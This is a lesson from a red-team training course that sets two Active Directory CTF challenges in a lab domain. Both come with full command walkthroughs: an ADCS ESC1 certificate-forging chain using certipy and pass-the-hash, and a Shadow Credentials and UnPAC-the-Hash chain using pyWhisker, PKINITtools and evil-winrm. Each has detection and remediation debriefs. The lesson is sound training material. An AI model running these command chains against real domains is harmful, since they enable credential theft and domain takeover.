---
title: "Red Team CTF Sprint — Day 2: ADCS and Shadow Credentials"
tags: [red-team, CTF, ADCS, ESC1, shadow-credentials, PKINIT, UnPAC-the-Hash,
  certipy, pyWhisker, certificate-abuse, T1649, T1556, sprint, intermediate,
  advanced, challenge]
module: 08-RedTeam-03
day: 552
related_topics:
  - Red Team CTF Sprint Day 1 (Day 551)
  - Shadow Credentials (Day 544)
  - ADCS Advanced (Day 545)
  - ADCS ESC1 Lab (Day 512)
  - Red Team CTF Sprint Day 3 (Day 553)
---

# Day 552 — Red Team CTF Sprint: Day 2

> "Certificates are the new password hashes. Defenders hardened NTLM, then
> defenders hardened Kerberos, and now certificate abuse is the vector that
> catches mature environments by surprise. Know this attack surface cold."
>
> — Ghost

---

## Goals

Execute an ESC1 ADCS certificate abuse chain to achieve domain admin impersonation.
Execute a Shadow Credentials attack to extract an NTLM hash without any
password change or account disruption.
Identify the correct detection for each attack performed.

**Prerequisites:** Days 511–513 (ADCS), Day 544 (Shadow Credentials),
Day 545 (ADCS advanced). Certipy and PKINITtools must be installed.
**Time budget:** 4 hours (2 hours per challenge).

---

## Challenge 1 — Sign Your Name as Someone Else

### Category
Active Directory / Certificate Services

### Difficulty
Intermediate–Advanced
Estimated time: 90 minutes for a student at target level

### Learning Objective
Enumerate Active Directory Certificate Services for ESC1 vulnerabilities and
use certipy to issue a certificate impersonating a Domain Admin, then
authenticate using PKINIT and retrieve the administrator's NTLM hash.

### Scenario

```
Environment: corp.local (same as Day 551)
Your credential: corp\jdoe / jdoe_pass

Intel brief:
  → The Certificate Authority is running on CA-01 (10.10.20.50)
  → CA name: corp-CA
  → IT recently deployed a certificate template called "CorpUserCert"
    for user authentication
  → Domain Admin: administrator@corp.local
  → The flag is at \\DC01\SYSVOL\corp.local\flags\flag.txt
    (readable by domain admins only)
  → Your goal: authenticate as administrator and read the flag
```

### Vulnerability / Technique
T1649 — Steal or Forge Authentication Certificates
ADCS ESC1 — Enrollee Supplies Subject (CWE-284)

### Hint Progression
1. `certipy find` with the `-vulnerable` flag will identify ESC1-vulnerable
   templates. Look for "Enrollee Supplies Subject" in the output.
2. The `-upn` flag in `certipy req` specifies which account you are
   impersonating via the Subject Alternative Name.
3. After `certipy auth`, you receive an NT hash. What impacket command
   lets you use an NT hash to access a remote SMB share?

### Solution Walkthrough

```bash
# STEP 1: Enumerate ADCS for vulnerable templates
proxychains certipy find \
    -u jdoe@corp.local -p 'jdoe_pass' \
    -dc-ip 10.10.20.5 \
    -vulnerable -stdout 2>/dev/null

# Output identifies:
#   Template Name: CorpUserCert
#   Enabled: True
#   Client Authentication: True
#   Enrollee Supplies Subject: True     ← ESC1
#   Enrollment Rights: CORP\Domain Users
#   [!] Vulnerabilities: ESC1

# STEP 2: Request a certificate with administrator's UPN as the SAN
proxychains certipy req \
    -u jdoe@corp.local -p 'jdoe_pass' \
    -ca corp-CA \
    -target 10.10.20.50 \
    -template CorpUserCert \
    -upn administrator@corp.local \
    -out administrator_cert

# Output: Saved PFX to 'administrator_cert.pfx'

# STEP 3: Authenticate using the certificate (PKINIT)
proxychains certipy auth \
    -pfx administrator_cert.pfx \
    -dc-ip 10.10.20.5

# Output:
#   Got hash for 'administrator@corp.local': aad3b435b51404ee:e19ccf75ee54e06b
#   Saved TGT to 'administrator.ccache'

# STEP 4: Use the NT hash to read the flag via PTH
proxychains impacket-smbclient \
    -hashes :e19ccf75ee54e06b \
    corp.local/administrator@10.10.20.5

smb: \corp.local\flags\> get flag.txt
# FLAG: CTF{esc1_san_injection_gives_you_the_keys}
```

### Flag
`CTF{esc1_san_injection_gives_you_the_keys}`

### Debrief Points

```
1. ESC1 was publicly documented by Will Schroeder and Lee Christensen
   in "Certified Pre-Owned" (SpecterOps, 2021). It was novel at publication;
   it is now one of the first things every red teamer checks.

2. The certificate issued in step 2 is a fully legitimate certificate,
   signed by the CA. Nothing about it is malformed. The CA is complying
   with the template's configuration — the template's configuration is wrong.

3. Detection:
     Event ID 4887 (Certificate Issued) with SubjectAltName containing
     a UPN that differs from the requester's own UPN.
     Sigma: alert on 4887 where RequesterName ≠ SAN UPN.

4. Fix: uncheck "Supply in the request" from the CorpUserCert template's
   Subject Name tab in the CA console. Restart the CA service.
   Run `certipy find -vulnerable` weekly as a defensive tool.

5. Impact scope: once you have the administrator NT hash, every domain-joined
   system is accessible. The certificate took 90 seconds to issue.
```

---

## Challenge 2 — The Invisible Key

### Category
Active Directory / Persistence / Credential Access

### Difficulty
Advanced
Estimated time: 90 minutes for a student at target level

### Learning Objective
Exploit GenericWrite on a user account to add a Shadow Credential, perform
PKINIT authentication as that user, and extract their NTLM hash via
UnPAC-the-Hash — without ever touching their password or disrupting their
normal login activity.

### Scenario

```
Environment: corp.local (same environment, fresh start — do not rely on
admin access from Challenge 1).

Your credential: corp\jdoe / jdoe_pass

Intel:
  → BloodHound shows jdoe has GenericWrite on helpdesk@corp.local
  → helpdesk is a member of "IT Support" group
  → IT Support has local admin on all workstations (10.10.20.0/24)
  → One of those workstations (10.10.20.25) has the flag at
    C:\Users\Administrator\Desktop\flag.txt
  → Your goal: get helpdesk's NTLM hash, use it to access WORKSTATION-02
```

### Vulnerability / Technique
T1556.006 — Modify Authentication Process: Multi-Factor Authentication
(Shadow Credentials abuse of msDS-KeyCredentialLink)
T1550.002 — Use Alternate Authentication Material: Pass the Hash

### Hint Progression
1. pyWhisker's `--action add` writes to `msDS-KeyCredentialLink`. You need
   GenericWrite on the target account to do this.
2. After adding the shadow credential, you have a `.pfx` file and a password.
   What PKINITtools script turns a PFX into a TGT?
3. gettgtpkinit.py gives you a TGT and a session key. getnthash.py uses
   the session key to extract the NTLM hash from the PAC.

### Solution Walkthrough

```bash
# STEP 1: Confirm GenericWrite from BloodHound
# Query: MATCH (u:User {name:"JDOE@CORP.LOCAL"})-[r:GenericWrite]->
#        (t:User {name:"HELPDESK@CORP.LOCAL"}) RETURN r

# STEP 2: List existing shadow credentials (baseline)
proxychains python3 pywhisker.py \
    -d corp.local -u jdoe -p 'jdoe_pass' \
    --target helpdesk \
    --action list \
    --dc-ip 10.10.20.5

# STEP 3: Add a shadow credential
proxychains python3 pywhisker.py \
    -d corp.local -u jdoe -p 'jdoe_pass' \
    --target helpdesk \
    --action add \
    --dc-ip 10.10.20.5

# Output:
#   [+] Saving certificate to: <GUID>.pfx
#   [+] Password: <RANDOM_PASS>

# STEP 4: PKINIT — get a TGT as helpdesk using the forged credential
proxychains python3 gettgtpkinit.py \
    corp.local/helpdesk \
    -cert-pfx <GUID>.pfx \
    -pfx-pass '<RANDOM_PASS>' \
    -dc-ip 10.10.20.5 \
    helpdesk.ccache

# Note the KDC session key printed in the output — needed for step 5

# STEP 5: UnPAC-the-Hash — extract helpdesk's NTLM hash
proxychains python3 getnthash.py \
    corp.local/helpdesk \
    -key <SESSION_KEY_FROM_STEP4> \
    -dc-ip 10.10.20.5

# Output: NTLM hash: aad3b435b51404ee:<helpdesk_ntlm>

# STEP 6: PTH to WORKSTATION-02 as local admin (helpdesk is IT Support = local admin)
proxychains evil-winrm \
    -i 10.10.20.25 \
    -u helpdesk \
    -H '<helpdesk_ntlm>'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
# FLAG: CTF{shadow_creds_no_password_change_needed}

# CLEANUP: remove the shadow credential
proxychains python3 pywhisker.py \
    -d corp.local -u jdoe -p 'jdoe_pass' \
    --target helpdesk \
    --action remove \
    --device-id <GUID> \
    --dc-ip 10.10.20.5
```

### Flag
`CTF{shadow_creds_no_password_change_needed}`

### Debrief Points

```
1. Shadow Credentials is uniquely stealthy: the helpdesk user experiences
   no disruption, no password change, no account lockout. Both the attacker
   and the legitimate user authenticate simultaneously — the account shows
   two valid sessions.

2. UnPAC-the-Hash is a deliberate Windows design decision: PKINIT returns
   the user's NT hash in the PAC for legacy Kerberos compatibility. This
   is not a bug — it is a documented feature being used as an attack primitive.

3. Detection requires Event ID 5136 auditing:
   AttributeLDAPDisplayName = msDS-KeyCredentialLink
   Sigma: alert on any write to this attribute from a non-system account.
   This is NOT enabled by default on most domains.

4. If your domain does not use Windows Hello for Business, every populated
   msDS-KeyCredentialLink attribute on a user object is suspicious.
   Run a quarterly audit: Get-ADUser -Filter * -Properties msDS-KeyCredentialLink
   | Where-Object { $_.msDS-KeyCredentialLink } | Select-Object Name.

5. The attack also works against computer accounts, including Domain
   Controllers — if you can write to a DC's computer object, you can
   get the DC machine account hash and DCSync.
```

---

## Engagement Log — Day 2 Sprint

```
Time    | Challenge | Action                              | Result
--------|-----------|-------------------------------------|-------
        | C1        | certipy find -vulnerable            |
        | C1        | ESC1 template identified            |
        | C1        | certipy req -upn administrator      |
        | C1        | certipy auth — NT hash received     |
        | C1        | PTH to DC — flag retrieved          |
        | C2        | GenericWrite confirmed in BH        |
        | C2        | pyWhisker add — PFX generated       |
        | C2        | gettgtpkinit — TGT + session key    |
        | C2        | getnthash — NTLM hash extracted     |
        | C2        | evil-winrm PTH — flag retrieved     |
        | C2        | pyWhisker remove — cleanup          |

Flags captured: [ ] C1  [ ] C2
Total time: _____ minutes
Cleanup completed: [ ] Yes  [ ] No
```

---

## Key Takeaways

1. ADCS ESC1 and Shadow Credentials are both certificate-based attack paths
   that bypass password-based authentication entirely. An environment that
   monitors passwords and MFA but ignores certificate issuance and
   msDS-KeyCredentialLink writes has a significant blind spot.
2. Both attacks produce legitimate artefacts — a properly signed certificate
   and a properly issued TGT. The detection surface is in the events that
   precede the authentication, not the authentication itself.
3. After every Shadow Credentials attack, cleanup (pyWhisker remove) is
   mandatory. Orphaned key credentials in msDS-KeyCredentialLink are a
   forensic indicator that a trained IR team will find months later.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q552.1, Q552.2 …).

---

## Navigation

← Previous: [Day 551 — Red Team CTF Sprint: Day 1](DAY-0551-Red-Team-CTF-Sprint-Day-1.md)
→ Next: [Day 553 — Red Team CTF Sprint: Day 3](DAY-0553-Red-Team-CTF-Sprint-Day-3.md)
